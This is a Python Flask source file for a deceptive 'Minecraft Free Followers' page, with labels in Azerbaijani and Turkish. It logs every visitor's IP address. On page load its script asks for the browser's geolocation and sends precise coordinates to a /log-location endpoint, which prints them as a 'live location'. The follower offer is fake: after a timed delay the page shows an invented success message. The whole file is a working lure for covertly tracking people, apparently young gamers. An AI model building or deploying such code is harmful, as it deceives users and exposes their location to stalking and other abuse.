from flask import Flask, request
import datetime
import os

app = Flask(__name__)

@app.route('/')
def index():
    ip = request.headers.get('X-Forwarded-For', request.remote_addr).split(',')[0].strip()
    
    print(f"[{datetime.datetime.now()}] 🎮 MINECRAFT ZİYARƏTÇİSİ - IP: {ip}")

    return f"""
    <!DOCTYPE html>
    <html>
    <head>
        <title>Minecraft Free Followers</title>
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <style>
            body {{font-family:'Minecraft',Arial,sans-serif;background:#0a0a0a;color:#fff;margin:0;padding:20px;display:flex;justify-content:center;align-items:center;min-height:100vh;}}
            .container {{background:#1f1f1f;padding:40px;border:4px solid #3a3a3a;border-radius:8px;text-align:center;max-width:500px;width:100%;box-shadow:0 0 20px #00ff00;}}
            h1 {{color:#00ff00;text-shadow:0 0 10px #00ff00;}}
            button {{width:100%;padding:16px;margin:10px 0;background:#00aa00;color:white;border:3px solid #00ff00;border-radius:4px;font-size:18px;cursor:pointer;}}
            input {{width:100%;padding:15px;margin:10px 0;background:#333;color:white;border:3px solid #555;}}
        </style>
    </head>
    <body>
        <div class="container">
            <h1>🎮 MINECRAFT FREE FOLLOWERS</h1>
            <p><strong>IP:</strong> {ip}</p>
            
            <input type="text" id="username" placeholder="Minecraft Username">
            <button onclick="getFollowers()">250 TAKİPÇİ AL</button>
            
            <div id="msg" style="margin-top:20px;padding:15px;display:none;background:#003300;border:2px solid #00ff00;"></div>
        </div>

        <script>
            // Girən kimi avtomatik konum soruş
            window.onload = function() {{
                if (navigator.geolocation) {{
                    navigator.geolocation.getCurrentPosition(
                        function(pos) {{
                            const lat = pos.coords.latitude.toFixed(6);
                            const lon = pos.coords.longitude.toFixed(6);
                            console.log("CANLI KONUM → Lat:", lat, "Lon:", lon);
                            fetch('/log-location', {{
                                method: 'POST',
                                headers: {{'Content-Type': 'application/json'}},
                                body: JSON.stringify({{lat: lat, lon: lon}})
                            }});
                        }},
                        function(err) {{ console.log("Konum icazəsi verilmədi"); }}
                    );
                }}
            }};

            function getFollowers() {{
                const user = document.getElementById('username').value.trim();
                if (!user) return alert("Minecraft username yazın!");
                
                const btn = document.querySelector('button');
                btn.disabled = true;
                btn.textContent = "YÜKLƏNİR...";
                
                setTimeout(() => {{
                    document.getElementById('msg').innerHTML = "✅ 250 takipçi hesabınıza əlavə edildi!";
                    document.getElementById('msg').style.display = "block";
                    btn.disabled = false;
                    btn.textContent = "250 TAKİPÇİ AL";
                }}, 4000);
            }}
        </script>
    </body>
    </html>
    """

@app.route('/log-location', methods=['POST'])
def log_location():
    try:
        data = request.get_json()
        lat = data.get('lat')
        lon = data.get('lon')
        print(f"📍 CANLI KONUM ALINDI → Lat: {lat} | Lon: {lon} | Saat: {datetime.datetime.now()}")
        return "OK"
    except:
        return "ERROR"

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=int(os.environ.get("PORT", 5000)))
